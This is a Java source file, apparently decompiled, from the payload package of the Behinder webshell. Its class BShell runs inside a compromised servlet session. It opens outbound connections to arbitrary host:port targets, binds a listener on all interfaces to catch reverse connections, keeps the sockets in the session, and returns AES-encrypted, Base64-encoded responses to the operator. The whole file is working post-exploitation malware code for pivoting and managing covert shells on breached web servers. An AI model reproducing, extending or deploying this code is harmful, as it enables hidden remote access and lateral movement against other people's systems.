package net.rebeyond.behinder.payload.java;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Method;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.nio.channels.ServerSocketChannel;
import java.nio.channels.SocketChannel;
import java.util.ArrayList;
import java.util.Enumeration;
import java.util.HashMap;
import java.util.Iterator;
import java.util.List;
import java.util.Map;
import java.util.Random;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.jsp.PageContext;

public class BShell implements Runnable {
   public static String action;
   public static String target;
   public static String type;
   public static String listenPort;
   private Object Request;
   private Object Response;
   private Object Session;

   public BShell() {
   }

   public BShell(Object session) {
      this.Session = session;
   }

   public boolean equals(Object obj) {
      PageContext page = (PageContext)obj;
      Map<String, String> result = new HashMap();

      try {
         this.fillContext(obj);
         if (action.equals("create")) {
            this.createBShell();
            ((Map)result).put("msg", target + "的BShell创建成功");
            ((Map)result).put("status", "success");
         } else if (action.equals("listen")) {
            int listenPort = this.listenBShell();
            ((Map)result).put("msg", listenPort + "");
            ((Map)result).put("status", "success");
         } else if (action.equals("list")) {
            result = this.listBShell();
         } else if (action.equals("listReverse")) {
            result = this.listReverseBShell();
         } else if (action.equals("close")) {
            this.closeBShell();
            ((Map)result).put("status", "success");
            ((Map)result).put("msg", "连接到【" + target + "】的BShell已关闭。");
         } else if (action.equals("stopReverse")) {
            ServerSocketChannel serverSocketChannel = (ServerSocketChannel)this.sessionGetAttribute(this.Session, "BShell_serverSocketChannel");
            if (serverSocketChannel != null) {
               serverSocketChannel.close();
               this.sessionRemoveAttribute(this.Session, "BShell_serverSocketChannel");
            }

            this.sessionRemoveAttribute(this.Session, "BShell_listenPort");
            this.sessionSetAttribute(this.Session, "BShell_listen", "false");
            ((Map)result).put("msg", BShell.listenPort + "");
            ((Map)result).put("status", "success");
         } else if (action.equals("clear")) {
            result = this.clearBShell();
         } else {
            ((Map)result).put("msg", "no action");
            ((Map)result).put("status", "success");
         }
      } catch (Exception var7) {
         var7.printStackTrace();
         ((Map)result).put("msg", var7.getMessage());
         ((Map)result).put("status", "fail");
      }

      try {
         Object so = this.Response.getClass().getMethod("getOutputStream").invoke(this.Response);
         Method write = so.getClass().getMethod("write", byte[].class);
         write.invoke(so, this.Encrypt(this.buildJson((Map)result, true).getBytes("UTF-8")));
         so.getClass().getMethod("flush").invoke(so);
         so.getClass().getMethod("close").invoke(so);
      } catch (Exception var6) {
         var6.printStackTrace();
      }

      return true;
   }

   private Map<String, String> listBShell() throws Exception {
      Map<String, String> result = new HashMap();
      Enumeration<String> keys = this.sessionGetAttributeNames(this.Session);
      List<Map<String, String>> objArr = new ArrayList();

      while(keys.hasMoreElements()) {
         String key = (String)keys.nextElement();
         String directBShellPre = "BShell_Forward_";
         String reverseBShellPre = "BShell_Reverse_";
         SocketChannel socketChannel;
         HashMap obj;
         if (key.startsWith(directBShellPre)) {
            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, key);
            obj = new HashMap();
            obj.put("target", key.replace(directBShellPre, ""));
            obj.put("status", socketChannel.isConnected() + "");
            objArr.add(obj);
         } else if (key.startsWith(reverseBShellPre)) {
            socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, key);
            obj = new HashMap();
            obj.put("target", key.replace(reverseBShellPre, ""));
            obj.put("status", socketChannel.isConnected() + "");
            objArr.add(obj);
         }
      }

      result.put("status", "success");
      result.put("msg", this.buildJsonArray(objArr, true));
      return result;
   }

   private Map<String, String> listReverseBShell() throws Exception {
      Map<String, String> result = new HashMap();
      Enumeration<String> keys = this.sessionGetAttributeNames(this.Session);
      List<Map<String, String>> objArr = new ArrayList();

      while(keys.hasMoreElements()) {
         String key = (String)keys.nextElement();
         String reverseBShellPre = "BShell_Reverse_";
         if (key.startsWith(reverseBShellPre)) {
            SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, key);
            Map<String, String> obj = new HashMap();
            obj.put("target", key.replace(reverseBShellPre, ""));
            obj.put("status", socketChannel.isConnected() + "");
            objArr.add(obj);
         }
      }

      result.put("status", "success");
      result.put("msg", this.buildJsonArray(objArr, true));
      return result;
   }

   private void closeBShell() throws Exception {
      String key = "BShell_%s_%s";
      String direction = "Forward";
      if (!type.equals("0") && !type.equals("1")) {
         if (type.equals("2")) {
            direction = "Reverse";
         } else if (type.equals("3")) {
            direction = "Reverse";
         }
      }

      key = String.format(key, direction, target);
      SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, key);
      if (socketChannel != null) {
         socketChannel.close();
      }

      this.sessionRemoveAttribute(this.Session, key);
   }

   private Map<String, String> closeReverseBShell() throws Exception {
      this.sessionSetAttribute(this.Session, "BShell_listen", "false");
      Enumeration<String> keys = this.sessionGetAttributeNames(this.Session);

      while(keys.hasMoreElements()) {
         String key = (String)keys.nextElement();
         if (key.startsWith("BShell")) {
         }
      }

      Map<String, String> result = new HashMap();
      if (this.sessionGetAttribute(this.Session, "BShellList") != null) {
         Map<String, Socket> BShellList = (Map)this.sessionGetAttribute(this.Session, "BShellList");
         if (BShellList.containsKey(target)) {
            Socket socket = (Socket)BShellList.get(target);
            if (socket != null && !socket.isClosed()) {
               socket.close();
            }

            BShellList.remove(target);
            result.put("status", "success");
            result.put("msg", "连接到【" + target + "】的BShell已关闭。");
         } else {
            result.put("status", "fail");
            result.put("msg", "没有找到连接到【" + target + "】的BShell。");
         }
      } else {
         result.put("status", "fail");
         result.put("msg", "没有存活的BShell连接");
      }

      return result;
   }

   private Map<String, String> clearBShell() throws Exception {
      Map<String, String> result = new HashMap();
      if (this.sessionGetAttribute(this.Session, "BShellList") != null) {
         this.sessionRemoveAttribute(this.Session, "BShellList");
      }

      result.put("status", "success");
      result.put("msg", "BShell已清空。");
      return result;
   }

   private String buildJsonArray(List<Map<String, String>> list, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      sb.append("[");
      Iterator var4 = list.iterator();

      while(var4.hasNext()) {
         Map<String, String> entity = (Map)var4.next();
         sb.append(this.buildJson(entity, encode) + ",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("]");
      return sb.toString();
   }

   private String buildJson(Map<String, String> entity, boolean encode) throws Exception {
      StringBuilder sb = new StringBuilder();
      String version = System.getProperty("java.version");
      sb.append("{");
      Iterator var5 = entity.keySet().iterator();

      while(var5.hasNext()) {
         String key = (String)var5.next();
         sb.append("\"" + key + "\":\"");
         String value = ((String)entity.get(key)).toString();
         if (encode) {
            Class Base64;
            Object Encoder;
            if (version.compareTo("1.9") >= 0) {
               this.getClass();
               Base64 = Class.forName("java.util.Base64");
               Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
               value = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
            } else {
               this.getClass();
               Base64 = Class.forName("sun.misc.BASE64Encoder");
               Encoder = Base64.newInstance();
               value = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, value.getBytes("UTF-8"));
               value = value.replace("\n", "").replace("\r", "");
            }
         }

         sb.append(value);
         sb.append("\",");
      }

      if (sb.toString().endsWith(",")) {
         sb.setLength(sb.length() - 1);
      }

      sb.append("}");
      return sb.toString();
   }

   private byte[] Encrypt(byte[] bs) throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      byte[] raw = key.getBytes("utf-8");
      SecretKeySpec skeySpec = new SecretKeySpec(raw, "AES");
      Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");
      cipher.init(1, skeySpec);
      byte[] encrypted = cipher.doFinal(bs);
      ByteArrayOutputStream bos = new ByteArrayOutputStream();
      bos.write(encrypted);
      return this.base64encode(bos.toByteArray()).getBytes();
   }

   private String base64encode(byte[] data) throws Exception {
      String result = "";
      String version = System.getProperty("java.version");

      Class Base64;
      try {
         this.getClass();
         Base64 = Class.forName("java.util.Base64");
         Object Encoder = Base64.getMethod("getEncoder", (Class[])null).invoke(Base64, (Object[])null);
         result = (String)Encoder.getClass().getMethod("encodeToString", byte[].class).invoke(Encoder, data);
      } catch (Throwable var7) {
         this.getClass();
         Base64 = Class.forName("sun.misc.BASE64Encoder");
         Object Encoder = Base64.newInstance();
         result = (String)Encoder.getClass().getMethod("encode", byte[].class).invoke(Encoder, data);
         result = result.replace("\n", "").replace("\r", "");
      }

      return result;
   }

   private int listenBShell() throws IOException {
      ServerSocketChannel serverSocketChannel = ServerSocketChannel.open();
      if (BShell.listenPort.equals("")) {
         serverSocketChannel.bind(new InetSocketAddress("0.0.0.0", 0));
      } else {
         serverSocketChannel.bind(new InetSocketAddress("0.0.0.0", Integer.parseInt(BShell.listenPort)));
      }

      int listenPort = serverSocketChannel.socket().getLocalPort();
      Map<String, Object> paramMap = new HashMap();
      paramMap.put("listenPort", listenPort);
      this.sessionSetAttribute(this.Session, "BShell_listenPort", listenPort);
      this.sessionSetAttribute(this.Session, "BShell_serverSocketChannel", serverSocketChannel);
      this.sessionSetAttribute(this.Session, "BShell_listen", "true");
      serverSocketChannel.socket().setReuseAddress(true);
      (new Thread(new BShell(this.Session))).start();
      return listenPort;
   }

   private void createBShell() throws IOException {
      SocketChannel bShellSocketChannel = SocketChannel.open();
      bShellSocketChannel.connect(new InetSocketAddress(target.split(":")[0], Integer.parseInt(target.split(":")[1])));
      bShellSocketChannel.configureBlocking(true);
      String key = "BShell_" + target;
      this.sessionSetAttribute(this.Session, key, bShellSocketChannel);
   }

   public void run() {
      try {
         ServerSocketChannel serverSocketChannel = (ServerSocketChannel)this.sessionGetAttribute(this.Session, "BShell_serverSocketChannel");

         while(true) {
            String key;
            if (this.sessionGetAttribute(this.Session, "BShell_listen").equals("false")) {
               try {
                  serverSocketChannel.close();
                  this.sessionRemoveAttribute(this.Session, "BShell_serverSocketChannel");
                  Enumeration<String> keys = this.sessionGetAttributeNames(this.Session);

                  while(keys.hasMoreElements()) {
                     key = (String)keys.nextElement();
                     if (key.startsWith("BShell_Reverse_")) {
                        SocketChannel socketChannel = (SocketChannel)this.sessionGetAttribute(this.Session, key);
                        socketChannel.close();
                        this.sessionRemoveAttribute(this.Session, key);
                     }
                  }

                  return;
               } catch (Exception var6) {
                  break;
               }
            }

            try {
               SocketChannel socketChannel = serverSocketChannel.accept();
               key = socketChannel.socket().getInetAddress().getHostAddress();
               String remotePort = socketChannel.socket().getPort() + "";
               key = "BShell_Reverse_" + key + ":" + remotePort;
               this.sessionSetAttribute(this.Session, key, socketChannel);
            } catch (Exception var7) {
               break;
            }
         }
      } catch (Exception var8) {
      }

   }

   private Map<String, String> str2map(String params) {
      Map<String, String> paramsMap = new HashMap();
      String[] var3 = params.split("\n");
      int var4 = var3.length;

      for(int var5 = 0; var5 < var4; ++var5) {
         String line = var3[var5];
         paramsMap.put(line.split("\\^")[0], line.split("\\^")[1]);
      }

      return paramsMap;
   }

   private void fillContext(Object obj) throws Exception {
      if (obj.getClass().getName().indexOf("PageContext") >= 0) {
         this.Request = obj.getClass().getMethod("getRequest").invoke(obj);
         this.Response = obj.getClass().getMethod("getResponse").invoke(obj);
         this.Session = obj.getClass().getMethod("getSession").invoke(obj);
      } else {
         Map<String, Object> objMap = (Map)obj;
         this.Session = objMap.get("session");
         this.Response = objMap.get("response");
         this.Request = objMap.get("request");
      }

      this.Response.getClass().getMethod("setCharacterEncoding", String.class).invoke(this.Response, "UTF-8");
   }

   private void sessionSetAttribute(Object session, String key, Object value) {
      try {
         session.getClass().getMethod("setAttribute", String.class, Object.class).invoke(session, key, value);
      } catch (Exception var5) {
      }

   }

   private Object sessionGetAttribute(Object session, String key) {
      Object result = null;

      try {
         result = session.getClass().getMethod("getAttribute", String.class).invoke(session, key);
      } catch (Exception var5) {
      }

      return result;
   }

   private Enumeration sessionGetAttributeNames(Object session) {
      Enumeration result = null;

      try {
         result = (Enumeration)session.getClass().getMethod("getAttributeNames").invoke(session);
      } catch (Exception var4) {
      }

      return result;
   }

   private void sessionRemoveAttribute(Object session, String key) {
      try {
         session.getClass().getMethod("removeAttribute").invoke(session, key);
      } catch (Exception var4) {
      }

   }

   private byte[] getMagic() throws Exception {
      String key = this.Session.getClass().getMethod("getAttribute", String.class).invoke(this.Session, "u").toString();
      int magicNum = Integer.parseInt(key.substring(0, 2), 16) % 16;
      Random random = new Random();
      byte[] buf = new byte[magicNum];

      for(int i = 0; i < buf.length; ++i) {
         buf[i] = (byte)random.nextInt(256);
      }

      return buf;
   }
}
